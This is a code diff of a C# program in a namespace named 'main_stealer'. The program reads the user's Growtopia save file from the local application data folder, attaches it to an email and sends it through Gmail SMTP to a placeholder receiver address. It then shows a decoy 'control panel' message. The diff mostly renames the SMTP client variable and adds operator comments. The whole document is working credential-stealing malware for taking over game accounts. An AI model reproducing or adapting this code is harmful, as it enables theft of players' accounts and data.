@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net.Mail;
 using System.Net;
 using System.Collections.Generic;
@@ -16,12 +16,12 @@ namespace main_stealer
     {
         static void Main(string[] args)
         {
-            SmtpClient sc = new SmtpClient();
-            sc.Port = 587;
-            sc.Host = "smtp.gmail.com";
-            sc.EnableSsl = true;
+            SmtpClient mfmo = new SmtpClient();
+            mfmo.Port = 587;
+            mfmo.Host = "smtp.gmail.com";
+            mfmo.EnableSsl = true;
 
-            sc.Credentials = new NetworkCredential("SENDERMAIL@gmail.com", "PASSWORD"); // sender of the mail , password of the mail
+            mfmo.Credentials = new NetworkCredential("SENDERMAIL@gmail.com", "PASSWORD"); // sender of the mail , password of the mail
                                                                                         // i suggest you to open a new mail for this
 
             MailMessage mail = new MailMessage();
@@ -29,6 +29,7 @@ namespace main_stealer
             mail.From = new MailAddress("SENDERMAIL@gmail.com", "NAME"); // sender of the mail , name of the sender
 
             mail.To.Add("RECEIVERMAIL@gmail.com"); // receiver of the mail
+            //mail.To.Add("RECEIVERMAIL@gmail.com"); // you can add multiple receivers
 
             mail.Subject = ""; // subject of the mail 
             /*DateTime date1 = DateTime.Now;      // date + time of time moment
@@ -36,11 +37,11 @@ namespace main_stealer
             mail.Subject = date1_str; */          // making subject of the mail date + time
                                                   // if u want to open this, erase /* and */
             mail.IsBodyHtml = true;
-            mail.Body = ""; // content of the mail
+            mail.Body = ""; // content of the mail, you can leave this empty
 
             mail.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat"));
 
-            sc.Send(mail);
+            mfmo.Send(mail);
             Console.Write("Press any key to close control panel.\n\n");
             Console.ReadKey();
         }
